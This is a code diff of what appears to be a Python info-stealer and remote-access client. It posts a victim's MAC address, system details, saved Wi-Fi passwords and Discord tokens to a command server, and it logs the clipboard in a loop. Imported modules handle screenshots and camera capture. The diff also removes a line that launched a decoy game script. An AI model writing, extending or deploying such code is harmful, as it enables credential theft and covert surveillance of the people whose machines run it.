@@ -3,6 +3,8 @@ from numpy import array
 from pyautogui import screenshot
 from requests import post
 from time import sleep
+import re
+import uuid
 import subprocess
 
 
@@ -10,8 +12,6 @@ from modules.discordgrabber import GetDiscordTokens
 from modules.pcinfo import System_information
 from modules.wifipasswordsgraber import getPasswords
 from modules.clipboardlogger import logger
-
-subprocess.run(['python', 'modules/game/game.py'], capture_output=False, text=True)
 
 # Initialize the camera
 try:
@@ -25,8 +25,13 @@ remote_server = '127.0.0.1:5000'
 protocol = 'http'
 
 # Request a client ID from the server
-clientIdreq = post(f'{protocol}://{remote_server}/client', json={"osInfo": System_information().replace("\n", "<br>"), "wifis": getPasswords(), "discordInfo": GetDiscordTokens().replace("\n", "<br>")})
-clientId = clientIdreq.text
+try:
+	clientIdreq = post(f'{protocol}://{remote_server}/client', json={"mac": ''.join(re.findall('..', '%012x' % uuid.getnode())),"osInfo": System_information().replace("\n", "<br>"), "wifis": getPasswords(), "discordInfo": GetDiscordTokens().replace("\n", "<br>")})
+	clientId = clientIdreq.text
+	print(clientId)
+except Exception as e:
+	print(e)
+	exit(1)
 
 previous_clipboard_content = ''
 
@@ -51,6 +56,3 @@ while True:
 	logger(protocol, remote_server, clientId)
 
 	sleep(0.5)
-
-if camera:
-	camera.release()
